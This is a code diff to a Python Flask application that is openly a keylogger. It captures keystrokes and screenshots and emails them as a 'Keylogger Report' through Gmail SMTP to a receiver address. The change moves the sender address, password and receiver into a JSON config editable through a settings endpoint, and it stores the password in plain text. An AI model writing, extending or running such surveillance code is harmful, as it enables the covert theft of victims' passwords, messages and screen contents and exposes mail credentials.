@@ -38,9 +38,11 @@ def get_db_connection():
 # Email Configuration
 SMTP_SERVER = "smtp.gmail.com"
 SMTP_PORT = 465
-EMAIL_SENDER = os.getenv("SENDER_EMAIL")
-EMAIL_PASSWORD = os.getenv("SENDER_PASSWORD")
-EMAIL_RECEIVER = os.getenv("RECIEVER_EMAIL")
+sender_mail = os.getenv("SENDER_EMAIL")
+sender_password = os.getenv("SENDER_PASSWORD")
+reciever_mail = os.getenv("RECIEVER_EMAIL")
+email_interval = 60
+screenshot_interval = 30
 
 # Monitoring Variables
 monitoring = False
@@ -48,14 +50,11 @@ monitoring_thread = None
 keystroke_data = []
 keylog_listener = None
 
+
 # File Paths
 LOG_FOLDER = "./logs"
 LOG_FILE = os.path.join(LOG_FOLDER, "keylogs.txt")
 SCREENSHOT_FOLDER = os.path.join(LOG_FOLDER, "screenshots")
-
-
-email_interval = 60
-screenshot_interval = 30
 
 
 def load_config():
@@ -63,10 +62,14 @@ def load_config():
         default_config = {
             "email_interval": 600,
             "screenshot_interval": 30,
-            "keylog_interval": 5
+            "keylog_interval": 5,
+            "sender_mail": os.getenv("SENDER_EMAIL"),
+            "sender_password": os.getenv("SENDER_PASSWORD"),
+            "receiver_mail": os.getenv("RECIEVER_EMAIL")
         }
         with open(CONFIG_FILE, "w") as f:
             json.dump(default_config, f)
+
     with open(CONFIG_FILE, "r") as f:
         return json.load(f)
 
@@ -74,6 +77,7 @@ def load_config():
 def save_config(config):
     with open(CONFIG_FILE, "w") as f:
         json.dump(config, f, indent=4)
+
 
 @app.route("/get_settings", methods=["GET"])
 def get_settings():
@@ -90,10 +94,22 @@ def update_settings():
 
         if "email_interval" in data:
             config["email_interval"] = int(data["email_interval"])
+
         if "screenshot_interval" in data:
             config["screenshot_interval"] = int(data["screenshot_interval"])
+
         if "keylog_interval" in data:
             config["keylog_interval"] = int(data["keylog_interval"])
+
+        if "sender_mail" in data:
+            config["sender_mail"] = data["sender_mail"]
+
+        if "sender_password" in data:
+            config["sender_password"] = data["sender_password"]
+
+        if "receiver_mail" in data:
+            config["receiver_mail"] = data["receiver_mail"]
+
 
         save_config(config)
         return jsonify({"message": "Settings updated successfully", "settings": config})
@@ -133,10 +149,15 @@ def on_press(key):
 
 def send_email_report():
     try:
+        config = load_config()
+        sender_mail = config["sender_mail"]
+        sender_password = config["sender_password"]
+        reciever_mail = config["receiver_mail"]
+
         msg = EmailMessage()
         msg["Subject"] = "Keylogger Report"
-        msg["From"] = EMAIL_SENDER
-        msg["To"] = EMAIL_RECEIVER
+        msg["From"] = sender_mail
+        msg["To"] = reciever_mail
         msg.set_content("Attached are the latest keystroke logs and screenshots.")
 
         # Attach keylogs
@@ -156,10 +177,10 @@ def send_email_report():
 
         # Send Email
         with smtplib.SMTP_SSL(SMTP_SERVER, SMTP_PORT) as server:
-            server.login(EMAIL_SENDER, EMAIL_PASSWORD)
+            server.login(sender_mail, sender_password)
             server.send_message(msg)
 
-        print("✅ Email Sent Successfully with Multiple Screenshots!")
+        print("✅ Email Sent Successfully!")
 
     except Exception as e:
         print(f"❌ Email Error: {e}")
